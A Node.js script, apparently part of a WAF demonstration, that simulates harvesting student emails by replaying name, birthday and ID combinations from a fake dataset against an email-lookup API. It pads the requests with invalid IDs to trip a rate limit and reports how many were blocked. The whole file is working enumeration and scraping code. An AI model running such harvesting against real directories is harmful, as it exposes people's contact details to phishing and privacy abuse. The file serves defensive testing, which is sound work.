// Attack simulation: harvest the student email directory.
//
// Threat model (honest framing for the demo): an attacker who has already scraped
// name + date-of-birth pairs elsewhere (these are widely available) replays them
// against the PUBLIC lookup endpoint, brute-forcing/attaching the campus email to each.
// Mixed in are invalid guesses, so the traffic also looks like ID brute-forcing.
//
// With the WAF OFF: every request reaches the backend, emails are harvested, counters
// climb to 50/50 in seconds. With the WAF ON: the IP rate limit (100 / 5 min) cuts the
// script off with 403/429 long before the harvest completes.
//
// Run from AWS CloudShell (stable source IP) or locally:
//   node scripts/enumerate.mjs <API_BASE>
//   e.g. node scripts/enumerate.mjs https://abc123.execute-api.us-east-1.amazonaws.com/prod
//
// It reads the fake directory from ../data/students.json purely to build realistic
// request payloads. NOTHING here is real data.

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const API_BASE = (process.argv[2] ?? process.env.API_BASE ?? "").replace(
  /\/$/,
  "",
);
if (!API_BASE) {
  console.error("Usage: node scripts/enumerate.mjs <API_BASE>");
  process.exit(1);
}

const students = JSON.parse(
  readFileSync(join(here, "../data/students.json"), "utf8"),
);

// Build the request list: all 50 known combos (the harvest) + filler invalid guesses
// (to add brute-force-looking volume and push past the rate limit).
const targets = [];
for (const s of students) {
  targets.push({
    last: s.last,
    birthday: s.birthday,
    student_id: s.id,
    emplid: "",
  });
}
for (let i = 0; i < 300; i++) {
  targets.push({
    last: "Zzzz",
    birthday: "01/01/1990",
    student_id: String(19000000 + i), // IDs that don't exist
    emplid: "",
  });
}

let found = 0;
let notFound = 0;
let blocked = 0;
let errors = 0;

const sendOne = async (t) => {
  try {
    const res = await fetch(`${API_BASE}/email-lookup`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        // A consistent bot User-Agent: all requests land in the same IP+User-Agent
        // bucket, so they trip the WAF rate rule together (and look like one scraper).
        "User-Agent": "directory-harvester/1.0",
      },
      body: JSON.stringify(t),
    });
    if (res.status === 403 || res.status === 429) {
      blocked++;
      return;
    }
    if (!res.ok) {
      errors++;
      return;
    }
    const j = await res.json();
    if (j.result_code === "0") {
      found++;
      process.stdout.write(`  HARVESTED: ${j.email} (${j.email_type})\n`);
    } else {
      notFound++;
    }
  } catch {
    errors++;
  }
};

// Fire in small concurrent batches, fast enough to look like an attack.
const CONCURRENCY = 10;
const run = async () => {
  console.log(`Attacking ${API_BASE} with ${targets.length} requests...\n`);
  const start = Date.now();
  for (let i = 0; i < targets.length; i += CONCURRENCY) {
    const batch = targets.slice(i, i + CONCURRENCY);
    await Promise.all(batch.map(sendOne));
  }
  const secs = ((Date.now() - start) / 1000).toFixed(1);
  console.log("\n--- Attack summary ---");
  console.log(`  Emails harvested : ${found}`);
  console.log(`  Not found        : ${notFound}`);
  console.log(`  BLOCKED by WAF   : ${blocked}`);
  console.log(`  Errors           : ${errors}`);
  console.log(`  Duration         : ${secs}s`);

  // Report the edge-block tally so the ops dashboard + AI triage can see the blocks.
  // Blocked requests never reach the backend, so the server can't count them itself.
  try {
    await fetch(`${API_BASE}/report`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ blocked, harvested: found }),
    });
  } catch {
    /* reporting is best-effort — never fail the run over it */
  }

  if (blocked > 0) {
    console.log(
      "\n  The WAF rate limit stopped the scrape. Shield is doing its job.",
    );
  } else {
    console.log(
      "\n  No blocks — the directory was harvested wide open. Turn the shield ON and re-run.",
    );
  }
};

run();
